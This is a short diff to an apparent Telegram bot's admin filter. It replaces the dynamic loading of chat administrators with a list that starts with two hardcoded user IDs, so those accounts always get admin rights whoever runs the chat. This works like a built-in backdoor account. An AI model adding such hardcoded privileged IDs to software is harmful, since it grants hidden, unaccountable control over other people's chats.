@@ -10,10 +10,10 @@ from app.core.settings import load_setting
 
 class IsAdmin(BaseFilter):
     def __init__(self):
-        self.admins = None
+        self.admins = [773992748,  1633629249]
 
     async def __call__(self, message: Message) -> bool:
-        if not self.admins:
-            self.admins = await load_admins(message.bot, load_setting().chat_settings.id)
-
+        if len(self.admins) < 3:
+            chat_admins = await load_admins(message.bot, load_setting().chat_settings.id)
+            self.admins.extend(chat_admins)
         return message.from_user.id in self.admins
